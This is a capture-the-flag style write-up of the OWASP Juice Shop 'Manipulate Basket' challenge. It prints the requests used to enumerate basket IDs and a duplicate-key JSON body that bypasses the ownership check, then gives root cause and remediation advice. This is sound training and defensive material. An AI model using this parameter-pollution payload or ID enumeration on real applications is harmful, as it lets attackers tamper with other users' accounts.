# Challenge: Manipulate Basket

## Category

Broken Access Control / HTTP Parameter Pollution

## Platform

OWASP Juice Shop

## Objective

Put an additional product into another user's shopping basket.

## What I observed

The application uses an API endpoint to add products to a basket:

```http
POST /api/BasketItems/
```

A normal request body looks like this:

```json
{
  "ProductId": 50,
  "BasketId": "6",
  "quantity": 1
}
```

The important fields are:

```text
ProductId
BasketId
quantity
```

The `BasketId` value identifies which basket the item will be added to.

## Initial hypothesis

Because this is a Broken Access Control challenge, I first checked whether I could change the `BasketId` value and add a product to another user's basket.

The basic idea was:

```text
If the backend trusts BasketId from the request, I may be able to change it to another user's basket.
```

## Testing steps

### 1. Identify my own basket

I inspected my basket using:

```http
GET /rest/basket/6
```

The response showed that basket `6` belonged to my current user:

```json
{
  "id": 6,
  "UserId": 24
}
```

So my basket ID was:

```text
6
```

### 2. Discover another valid basket

I changed the basket ID in the request:

```http
GET /rest/basket/7
```

The response returned another user's basket:

```json
{
  "id": 7,
  "UserId": 4
}
```

So I identified another valid basket ID:

```text
7
```

This confirmed that basket IDs were predictable and could be enumerated.

### 3. Attempt a direct IDOR attack

I tried to add a product directly to the other user's basket:

```json
{
  "ProductId": 52,
  "BasketId": "7",
  "quantity": 1
}
```

The server rejected the request with:

```text
401 Unauthorized
Invalid BasketId
```

This showed that the application had some ownership validation. It did not allow a simple direct change from my basket ID to another user's basket ID.

### 4. Analyze the failed request

The error showed that the backend was trying to insert data into the `BasketItems` table:

```sql
INSERT INTO `BasketItems`
(`ProductId`,`BasketId`,`id`,`quantity`,`createdAt`,`updatedAt`)
VALUES ($1,$2,NULL,$3,$4,$5);
```

This confirmed that the endpoint was responsible for inserting products into baskets.

The important point was:

```text
The server validates BasketId, then inserts the BasketItem.
```

The next question became:

```text
Can I make the validation use my valid BasketId, but make the insert use another BasketId?
```

### 5. Use HTTP Parameter Pollution

I then tested duplicate `BasketId` parameters in the JSON body:

```json
{
  "ProductId": 53,
  "BasketId": "6",
  "BasketId": "7",
  "quantity": 1
}
```

The first `BasketId` was my valid basket:

```text
6
```

The second `BasketId` was the target basket:

```text
7
```

The challenge was solved after sending this request.

## Result

The product was added to another user's basket.

The challenge was solved by abusing inconsistent handling of duplicate JSON parameters.

## Why it worked

The server handled duplicate `BasketId` values inconsistently.

The backend likely validated the first `BasketId`:

```text
BasketId = 6 → belongs to me → validation passes
```

But the insert operation used the second `BasketId`:

```text
BasketId = 7 → another user's basket → item inserted there
```

So the request bypassed the ownership check.

## Root cause

The root cause is broken access control combined with inconsistent duplicate parameter handling.

Main issues:

* The application accepted duplicate JSON keys.
* The validation logic and insertion logic did not consistently use the same `BasketId` value.
* The backend trusted a client-controlled basket identifier.
* Basket ownership was not enforced reliably at the final sensitive action.
* Basket IDs were predictable and enumerable.

## Impact in a real application

In a real application, this vulnerability could allow an attacker to:

* Add items to another user's basket.
* Manipulate another user's shopping session.
* Abuse discounts or checkout workflows.
* Interfere with orders or purchases.
* Cause financial, privacy, or business logic issues.

This type of vulnerability is serious because the user is performing an action on a resource they do not own.

## Remediation

Recommended fixes:

* Reject requests containing duplicate JSON keys.
* Normalize and validate input before processing it.
* Perform authorization checks server-side using the authenticated user's session, not client-controlled IDs.
* Ensure the same validated value is used throughout the request lifecycle.
* Verify basket ownership immediately before inserting a basket item.
* Use unpredictable identifiers where appropriate, but do not rely on unpredictability alone.
* Add security tests for IDOR and HTTP Parameter Pollution.
* Log and monitor suspicious requests containing duplicate parameters.

## What I learned

This challenge taught me that Broken Access Control is not always a simple IDOR where changing an ID directly works.

Sometimes the direct attack is blocked, but the application can still be bypassed by confusing how the server parses input.

The key trick was HTTP Parameter Pollution:

```text
Send the same parameter twice.
Use the first value for validation.
Use the second value for the action.
```

## Mistake I made

At first, I tried to change only the `BasketId` from my basket to another user's basket:

```json
{
  "BasketId": "7"
}
```

This failed because the backend correctly rejected the basket as invalid for my user.

I also considered SQL injection and JWT tampering, but this challenge was not about those techniques.

The correct direction was to stay focused on Broken Access Control and test how the backend handles duplicate parameters.

## Memory rule

```text
If changing an ID directly is blocked, test parameter pollution.
```

For this challenge:

```text
First BasketId = my valid basket
Second BasketId = target user's basket
```

## Related patterns

* Broken Access Control
* IDOR
* HTTP Parameter Pollution
* JSON parameter pollution
* Inconsistent server-side validation
* API business logic abuse
